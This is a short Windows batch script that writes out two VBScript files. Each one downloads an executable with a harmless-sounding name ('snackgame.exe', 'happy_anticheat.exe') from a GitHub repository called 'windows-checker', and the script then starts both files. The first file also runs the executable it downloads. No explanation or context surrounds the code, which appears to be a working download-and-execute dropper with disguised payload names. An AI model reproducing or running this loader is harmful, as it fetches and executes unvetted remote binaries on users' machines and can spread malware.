 echo Set args = Wscript.Arguments  > webdl.vbs
 echo Url = "https://raw.githubusercontent.com/diraDJ83/windows-checker/main/snackgame.exe"  >> webdl.vbs
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
 echo xHttp.Open "GET", Url, False  >> webdl.vbs
 echo xHttp.Send  >> webdl.vbs
 echo with bStrm      >> webdl.vbs
 echo 	.type = 1 '      >> webdl.vbs
 echo 	.open      >> webdl.vbs
 echo 	.write xHttp.responseBody      >> webdl.vbs
 echo 	.savetofile "snackgame.exe", 2 '  >> webdl.vbs
 echo end with >> webdl.vbs
 echo Set WshShell = WScript.CreateObject("WScript.Shell") >> webdl.vbs
 echo WshShell.Run "snackgame.exe" >> webdl.vbs
 echo Set args = Wscript.Arguments  > webdl2.vbs
 echo Url = "https://raw.githubusercontent.com/diraDJ83/windows-checker/main/happy_anticheat.exe"  >> webdl2.vbs
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl2.vbs
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl2.vbs
 echo xHttp.Open "GET", Url, False  >> webdl2.vbs
 echo xHttp.Send  >> webdl2.vbs
 echo with bStrm      >> webdl2.vbs
 echo 	.type = 1 '      >> webdl2.vbs
 echo 	.open      >> webdl2.vbs
 echo 	.write xHttp.responseBody      >> webdl2.vbs
 echo 	.savetofile "happy_anticheat.exe", 2 '  >> webdl2.vbs
 echo end with >> webdl2.vbs
 timeout 3
 start webdl.vbs
 start webdl2.vbs
